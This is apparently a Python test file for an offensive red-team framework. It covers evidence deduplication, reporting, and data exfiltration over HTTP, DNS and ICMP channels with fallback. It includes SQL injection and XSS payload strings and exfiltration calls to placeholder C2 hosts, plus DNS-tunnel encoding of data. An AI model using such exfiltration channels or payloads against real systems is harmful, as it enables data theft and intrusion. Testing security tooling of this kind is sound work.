"""
Tests for Phase 1 — Extraction subsystem.

Covers:
- EvidenceStore deduplication, grouping, merge, export
- Real exfiltration channels (HTTP, DNS, ICMP) with mocks
- Channel fallback logic
- Red Team Reporter (Markdown, HTML, JSON)
"""

import asyncio
import json
import gzip
import base64
import os
import tempfile
import unittest
from unittest.mock import MagicMock, patch, AsyncMock
from datetime import datetime, timezone

import pytest

# ── Evidence Store Tests ─────────────────────────────────────────────────

from backend.core.evidence_store import (
    EvidenceStore,
    EvidenceItem,
    EvidenceSeverity,
    EvidenceType,
)


class TestEvidenceStore:
    """Tests for evidence consolidation engine."""

    def _make_item(self, engine="sqlmap", vector="param_id", payload="' OR 1=1", **kw):
        return EvidenceItem(
            scan_id="scan_001",
            engine=engine,
            vector=vector,
            vuln_type=kw.get("vuln_type", EvidenceType.SQLI),
            severity=kw.get("severity", EvidenceSeverity.HIGH),
            confidence=kw.get("confidence", 0.9),
            payload=payload,
            parameter=kw.get("parameter", "id"),
            url=kw.get("url", "http://target.com/search"),
        )

    def test_add_item(self):
        store = EvidenceStore(scan_id="scan_001")
        item = self._make_item()
        assert store.add(item) is True
        assert store.count == 1

    def test_deduplication(self):
        store = EvidenceStore(scan_id="scan_001")
        item1 = self._make_item(confidence=0.8)
        item2 = self._make_item(confidence=0.7)  # Same payload/vector/engine
        store.add(item1)
        result = store.add(item2)
        assert result is False
        assert store.count == 1
        assert store._duplicates_skipped == 1

    def test_dedup_keeps_higher_confidence(self):
        store = EvidenceStore(scan_id="scan_001")
        item1 = self._make_item(confidence=0.6)
        item2 = self._make_item(confidence=0.95)  # Higher confidence
        store.add(item1)
        store.add(item2)
        assert store.count == 1
        assert store.get_all()[0].confidence == 0.95

    def test_different_payloads_not_deduped(self):
        store = EvidenceStore(scan_id="scan_001")
        store.add(self._make_item(payload="' OR 1=1"))
        store.add(self._make_item(payload="' UNION SELECT NULL--"))
        assert store.count == 2

    def test_get_by_severity(self):
        store = EvidenceStore(scan_id="scan_001")
        store.add(self._make_item(severity=EvidenceSeverity.CRITICAL, payload="p1"))
        store.add(self._make_item(severity=EvidenceSeverity.HIGH, payload="p2"))
        store.add(self._make_item(severity=EvidenceSeverity.LOW, payload="p3"))
        by_sev = store.get_by_severity()
        assert "critical" in by_sev
        assert "high" in by_sev
        assert "low" in by_sev

    def test_get_by_engine(self):
        store = EvidenceStore(scan_id="scan_001")
        store.add(self._make_item(engine="sqlmap", payload="p1"))
        store.add(self._make_item(engine="burp", payload="p2"))
        by_engine = store.get_by_engine()
        assert "sqlmap" in by_engine
        assert "burp" in by_engine

    def test_get_by_type(self):
        store = EvidenceStore(scan_id="scan_001")
        store.add(self._make_item(vuln_type=EvidenceType.SQLI, payload="p1"))
        store.add(self._make_item(vuln_type=EvidenceType.XSS, payload="p2"))
        by_type = store.get_by_type()
        assert "sql_injection" in by_type
        assert "xss" in by_type

    def test_get_confirmed_filters_by_confidence(self):
        store = EvidenceStore(scan_id="scan_001")
        store.add(self._make_item(confidence=0.9, payload="p1"))
        store.add(self._make_item(confidence=0.3, payload="p2"))
        confirmed = store.get_confirmed(min_confidence=0.7)
        assert len(confirmed) == 1
        assert confirmed[0].confidence == 0.9

    def test_merge_stores(self):
        store1 = EvidenceStore(scan_id="scan_001")
        store2 = EvidenceStore(scan_id="scan_001")
        store1.add(self._make_item(payload="p1"))
        store2.add(self._make_item(payload="p2"))
        store2.add(self._make_item(payload="p3"))
        new_count = store1.merge(store2)
        assert new_count == 2
        assert store1.count == 3

    def test_export_json(self):
        store = EvidenceStore(scan_id="scan_001")
        store.add(self._make_item())
        exported = store.export_json()
        data = json.loads(exported)
        assert data["scan_id"] == "scan_001"
        assert data["total_findings"] == 1
        assert len(data["findings"]) == 1
        assert data["findings"][0]["engine"] == "sqlmap"

    def test_export_summary(self):
        store = EvidenceStore(scan_id="scan_001")
        store.add(self._make_item(severity=EvidenceSeverity.CRITICAL))
        summary = store.export_summary()
        assert "CRITICAL: 1" in summary
        assert "scan_001" in summary

    def test_save_and_load(self):
        store = EvidenceStore(scan_id="scan_001")
        store.add(self._make_item(payload="test_payload"))

        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            path = f.name

        try:
            store.save_to_file(path)
            loaded = EvidenceStore.load_from_file(path)
            assert loaded.count == 1
            assert loaded.scan_id == "scan_001"
            assert loaded.get_all()[0].payload == "test_payload"
        finally:
            os.unlink(path)

    def test_add_many(self):
        store = EvidenceStore(scan_id="scan_001")
        items = [self._make_item(payload=f"p{i}") for i in range(5)]
        added = store.add_many(items)
        assert added == 5
        assert store.count == 5


# ── Evidence Exfil Tests ─────────────────────────────────────────────────

from backend.offensiva.evidence_exfil import (
    EvidenceExfilOrchestrator,
    ExfilChannel,
    ExfilResult,
)


class TestEvidenceExfilOrchestrator(unittest.IsolatedAsyncioTestCase):
    """Tests for real exfiltration channels."""

    @patch("backend.offensiva.evidence_exfil.get_post_exfiltration_policy")
    async def test_http_channel_success(self, mock_policy_fn):
        mock_policy = MagicMock()
        mock_policy.can_exfiltrate.return_value = True
        mock_policy_fn.return_value = mock_policy

        orchestrator = EvidenceExfilOrchestrator(c2_url="http://localhost:9999/loot")

        # Mock the HTTP method to succeed
        orchestrator._try_http = AsyncMock(return_value=True)
        orchestrator._http_available = True

        result = await orchestrator.exfiltrate(
            b"secret_data", "target.com", "db_dump.sql", ExfilChannel.HTTP
        )
        assert result.success is True
        assert result.channel == ExfilChannel.HTTP
        assert result.bytes_sent == len(b"secret_data")

    @patch("backend.offensiva.evidence_exfil.get_post_exfiltration_policy")
    async def test_dns_channel_success(self, mock_policy_fn):
        mock_policy = MagicMock()
        mock_policy.can_exfiltrate.return_value = True
        mock_policy_fn.return_value = mock_policy

        orchestrator = EvidenceExfilOrchestrator(dns_domain="test.local")
        orchestrator._try_dns = AsyncMock(return_value=5)  # 5 chunks sent
        orchestrator._dns_available = True

        result = await orchestrator.exfiltrate(
            b"secret", "target.com", "file.txt", ExfilChannel.DNS
        )
        assert result.success is True
        assert result.channel == ExfilChannel.DNS

    @patch("backend.offensiva.evidence_exfil.get_post_exfiltration_policy")
    async def test_icmp_channel_success(self, mock_policy_fn):
        mock_policy = MagicMock()
        mock_policy.can_exfiltrate.return_value = True
        mock_policy_fn.return_value = mock_policy

        orchestrator = EvidenceExfilOrchestrator(icmp_destination="192.168.1.1")
        orchestrator._try_icmp = AsyncMock(return_value=True)
        orchestrator._icmp_available = True

        result = await orchestrator.exfiltrate(
            b"data", "target.com", "file.txt", ExfilChannel.ICMP
        )
        assert result.success is True
        assert result.channel == ExfilChannel.ICMP

    @patch("backend.offensiva.evidence_exfil.get_post_exfiltration_policy")
    async def test_auto_fallback_http_to_dns(self, mock_policy_fn):
        """AUTO mode: HTTP fails → fallback to DNS."""
        mock_policy = MagicMock()
        mock_policy.can_exfiltrate.return_value = True
        mock_policy_fn.return_value = mock_policy

        orchestrator = EvidenceExfilOrchestrator()
        orchestrator._http_available = True
        orchestrator._dns_available = True
        orchestrator._try_http = AsyncMock(return_value=False)  # HTTP fails
        orchestrator._try_dns = AsyncMock(return_value=3)  # DNS succeeds

        result = await orchestrator.exfiltrate(
            b"data", "target.com", "file.txt", ExfilChannel.AUTO
        )
        assert result.success is True
        assert result.channel == ExfilChannel.DNS
        orchestrator._try_http.assert_called_once()

    @patch("backend.offensiva.evidence_exfil.get_post_exfiltration_policy")
    async def test_policy_blocking(self, mock_policy_fn):
        mock_policy = MagicMock()
        mock_policy.can_exfiltrate.return_value = False
        mock_policy_fn.return_value = mock_policy

        orchestrator = EvidenceExfilOrchestrator()
        result = await orchestrator.exfiltrate(
            b"sensitive", "blocked_target.com", "file.txt"
        )
        assert result.success is False
        assert "Blocked by policy" in result.message

    async def test_payload_preparation(self):
        orchestrator = EvidenceExfilOrchestrator()
        data = b"hello world"
        payload = await orchestrator._prepare_payload(data, "test.txt")

        # Reverse process to verify
        decompressed = gzip.decompress(payload)
        meta = json.loads(decompressed)
        assert meta["filename"] == "test.txt"
        assert base64.b64decode(meta["content"]) == data
        assert "session_id" in meta

    @patch("backend.offensiva.evidence_exfil.get_post_exfiltration_policy")
    async def test_all_channels_fail(self, mock_policy_fn):
        mock_policy = MagicMock()
        mock_policy.can_exfiltrate.return_value = True
        mock_policy_fn.return_value = mock_policy

        orchestrator = EvidenceExfilOrchestrator()
        orchestrator._http_available = False
        orchestrator._dns_available = False
        orchestrator._icmp_available = False

        result = await orchestrator.exfiltrate(
            b"data", "target.com", "file.txt", ExfilChannel.AUTO
        )
        assert result.success is False
        assert "failed" in result.message.lower()

    def test_get_available_channels(self):
        orchestrator = EvidenceExfilOrchestrator(c2_url="http://c2.test/loot")
        orchestrator._http_available = True
        orchestrator._dns_available = True
        orchestrator._icmp_available = False
        channels = orchestrator.get_available_channels()
        assert ExfilChannel.HTTP in channels
        assert ExfilChannel.DNS in channels
        assert ExfilChannel.ICMP not in channels


# ── DNS Encoder Roundtrip Test ───────────────────────────────────────────

from backend.exfiltration.dns_tunnel import DNSClientEncoder


class TestDNSEncoderRoundtrip:
    """Test DNS encoding produces valid, decodable queries."""

    def test_encode_produces_queries(self):
        encoder = DNSClientEncoder(domain="exfil.test", session_id="abcd")
        data = b"Hello, DNS exfiltration test data"
        queries = encoder.encode_file(data, chunk_size=30)

        assert len(queries) > 0
        # Last query should be the end marker
        assert queries[-1].startswith("end.")
        # All queries should end with the domain
        for q in queries:
            assert q.endswith("exfil.test")

    def test_encode_roundtrip(self):
        """Encode data and verify it can be decoded back."""
        encoder = DNSClientEncoder(domain="exfil.test", session_id="abcd")
        original = b"Test data for roundtrip verification"
        queries = encoder.encode_file(original, chunk_size=30)

        # Extract chunks from queries (skip end marker)
        chunks = {}
        for q in queries:
            parts = q.replace(".exfil.test", "").split(".")
            if parts[0] == "end":
                continue
            seq = int(parts[0])
            chunk = parts[1]
            chunks[seq] = chunk

        # Reassemble
        import base64
        sorted_seqs = sorted(chunks.keys())
        full_b32 = "".join([chunks[s] for s in sorted_seqs])
        # Add padding
        missing = len(full_b32) % 8
        if missing:
            full_b32 += "=" * (8 - missing)
        decoded = base64.b32decode(full_b32)
        assert decoded == original


# ── Red Team Reporter Tests ──────────────────────────────────────────────

from backend.reporting.red_team_report import RedTeamReporter, ReportFinding


class TestRedTeamReporter:
    """Tests for the enhanced reporting module."""

    def _make_reporter(self):
        reporter = RedTeamReporter(
            client_name="Test Corp", target_url="http://target.test"
        )
        reporter.add_finding(ReportFinding(
            title="SQL Injection in login",
            severity="Critical",
            description="Time-based blind SQLi found",
            evidence="sqlmap output showing DB extraction",
            remediation="Use parameterized queries",
            vuln_type="sql_injection",
            engine="sqlmap",
            parameter="username",
            confidence=0.95,
        ))
        reporter.add_finding(ReportFinding(
            title="XSS in search",
            severity="Medium",
            description="Reflected XSS in search parameter",
            evidence="<script>alert(1)</script>",
            remediation="Encode output",
            vuln_type="xss",
            engine="burp",
            parameter="q",
            confidence=0.8,
        ))
        reporter.log_action("scan_start", "Initiated scan")
        reporter.log_action("finding_confirmed", "SQLi confirmed")
        return reporter

    def test_markdown_report(self):
        reporter = self._make_reporter()
        md = reporter.generate_markdown_report()
        assert "# Red Team Engagement Report" in md
        assert "Test Corp" in md
        assert "SQL Injection in login" in md
        assert "MITRE ATT&CK" in md
        assert "CVSS" in md

    def test_html_report(self):
        reporter = self._make_reporter()
        html = reporter.generate_html_report()
        assert "<!DOCTYPE html>" in html
        assert "Test Corp" in html
        assert "SQL Injection in login" in html
        assert "Risk Score" in html

    def test_json_report(self):
        reporter = self._make_reporter()
        json_str = reporter.generate_json_report()
        data = json.loads(json_str)
        assert data["client"] == "Test Corp"
        assert data["summary"]["total_findings"] == 2
        assert len(data["findings"]) == 2
        assert data["findings"][0]["severity"] == "Critical"

    def test_mitre_auto_mapping(self):
        reporter = self._make_reporter()
        finding = reporter.findings[0]
        assert finding.mitre_attack_id == "T1190"
        assert "Exploit" in finding.mitre_technique

    def test_cvss_auto_scoring(self):
        reporter = self._make_reporter()
        critical = reporter.findings[0]
        medium = reporter.findings[1]
        assert critical.cvss_score == 9.8
        assert medium.cvss_score == 5.3

    def test_risk_score_calculation(self):
        reporter = self._make_reporter()
        score = reporter._calculate_risk_score()
        assert 0.0 < score <= 10.0

    def test_add_finding_from_evidence_item(self):
        reporter = RedTeamReporter(client_name="Test")
        item = EvidenceItem(
            scan_id="scan_001",
            engine="sqlmap",
            vector="param_id",
            vuln_type=EvidenceType.SQLI,
            severity=EvidenceSeverity.HIGH,
            confidence=0.9,
            payload="' OR 1=1",
            parameter="id",
            url="http://target.com/page",
            response_snippet="SQL error detected",
        )
        finding = reporter.add_finding_from_evidence(item)
        assert finding.severity == "High"
        assert finding.engine == "sqlmap"
        assert len(reporter.findings) == 1


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
